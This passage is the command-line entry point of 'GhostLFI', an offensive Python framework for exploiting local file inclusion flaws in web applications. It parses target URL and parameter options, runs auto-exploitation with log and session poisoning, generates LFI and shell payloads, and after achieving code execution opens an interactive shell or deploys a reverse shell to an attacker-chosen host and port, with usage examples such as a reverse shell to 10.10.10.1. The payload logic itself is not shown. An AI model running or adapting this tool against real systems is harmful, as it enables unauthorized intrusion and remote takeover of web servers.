        description='GhostLFI - Local File Inclusion Exploitation Framework by Ghost Ops Security',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Auto-exploit (recommended)
  python3 ghostlfi.py -u http://target.com/page.php -p file --auto
  
  # Auto-exploit with advanced techniques
  python3 ghostlfi.py -u http://target.com/page.php -p file --auto --advanced
  
  # Interactive shell
  python3 ghostlfi.py -u http://target.com/page.php -p file --auto --shell
  
  # Reverse shell
  python3 ghostlfi.py -u http://target.com/page.php -p file --auto --revshell --lhost 10.10.10.1
  
  # Generate payloads
  python3 ghostlfi.py -u http://target.com/page.php -p file --generate lfi
  python3 ghostlfi.py -u http://target.com/page.php -p file --generate wrappers
  python3 ghostlfi.py -u http://target.com/page.php -p file --generate shells
  python3 ghostlfi.py -u http://target.com/page.php -p file --generate revshell
  
  # Test specific techniques
  python3 ghostlfi.py -u http://target.com/page.php -p file --test-bypass
  python3 ghostlfi.py -u http://target.com/page.php -p file --test-log-poison
  python3 ghostlfi.py -u http://target.com/page.php -p file --test-session-poison

Ghost Ops Security | For Authorized Testing Only
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--parameter', required=True, help='Vulnerable parameter')
    parser.add_argument('--proxy', help='Proxy (http://127.0.0.1:8080)')
    
    # Modes
    parser.add_argument('--auto', action='store_true', help='Auto-exploit mode (recommended)')
    parser.add_argument('--advanced', action='store_true', help='Include advanced techniques (log/session poisoning)')
    parser.add_argument('--shell', action='store_true', help='Interactive shell')
    parser.add_argument('--revshell', action='store_true', help='Reverse shell')
    parser.add_argument('--lhost', help='Your IP for reverse shell')
    parser.add_argument('--lport', type=int, default=4444, help='Your port for reverse shell')
    
    # Testing
    parser.add_argument('--test-bypass', action='store_true', help='Test LFI bypass techniques')
    parser.add_argument('--test-log-poison', action='store_true', help='Test log poisoning')
    parser.add_argument('--test-session-poison', action='store_true', help='Test session poisoning')
    
    # Generation
    parser.add_argument('--generate', choices=['lfi', 'wrappers', 'shells', 'revshell'], help='Generate payloads')
    
    args = parser.parse_args()
    
    exploiter = UltimateLFIExploiter(args.url, args.parameter, args.proxy)
    exploiter.print_banner()
    
    # Generate mode
    if args.generate:
        exploiter.show_payloads(args.generate)
        sys.exit(0)
    
    # Test specific techniques
    if args.test_bypass:
        exploiter.test_lfi_bypasses()
        sys.exit(0)
    
    if args.test_log_poison:
        exploiter.test_log_poisoning()
        sys.exit(0)
    
    if args.test_session_poison:
        exploiter.test_session_poisoning()
        sys.exit(0)
    
    # Auto-exploit mode
    if args.auto or not any([args.test_bypass, args.test_log_poison, args.test_session_poison]):
        success = exploiter.auto_exploit(include_advanced=args.advanced)
        
        exploiter.print_summary()
        
        if success and exploiter.rce_method:
            print(f"\n{Fore.GREEN}{'='*60}")
            print(f"[SUCCESS] RCE Achieved!")
            print(f"{'='*60}{Style.RESET_ALL}")
            
            if args.revshell:
                if args.lhost:
                    exploiter.deploy_reverse_shell(args.lhost, args.lport)
                else:
                    lhost = input(f"\n{Fore.YELLOW}Enter your IP: {Style.RESET_ALL}")
                    lport_input = input(f"{Fore.YELLOW}Enter port [4444]: {Style.RESET_ALL}")
                    lport = int(lport_input) if lport_input else 4444
                    exploiter.deploy_reverse_shell(lhost, lport)
            
            elif args.shell:
                exploiter.interactive_shell()
            
            else:
                print(f"\n{Fore.YELLOW}[?] What would you like to do?{Style.RESET_ALL}")
                print(f"  1) Interactive shell")
                print(f"  2) Reverse shell")
                print(f"  3) Generate payloads")
                print(f"  4) Exit")
                
                choice = input(f"\n{Fore.YELLOW}Choice [1]: {Style.RESET_ALL}") or "1"
                
                if choice == "1":
                    exploiter.interactive_shell()
                elif choice == "2":
                    lhost = input(f"{Fore.YELLOW}Enter your IP: {Style.RESET_ALL}")
                    lport_input = input(f"{Fore.YELLOW}Enter port [4444]: {Style.RESET_ALL}")
                    lport = int(lport_input) if lport_input else 4444
                    exploiter.deploy_reverse_shell(lhost, lport)
                elif choice == "3":
                    print(f"\n{Fore.YELLOW}What to generate? (lfi/wrappers/shells/revshell): {Style.RESET_ALL}", end='')
                    gen_type = input() or "shells"
                    exploiter.show_payloads(gen_type)
                else:
                    print(f"{Fore.YELLOW}[*] Exiting...{Style.RESET_ALL}")


if __name__ == '__main__':
    main()
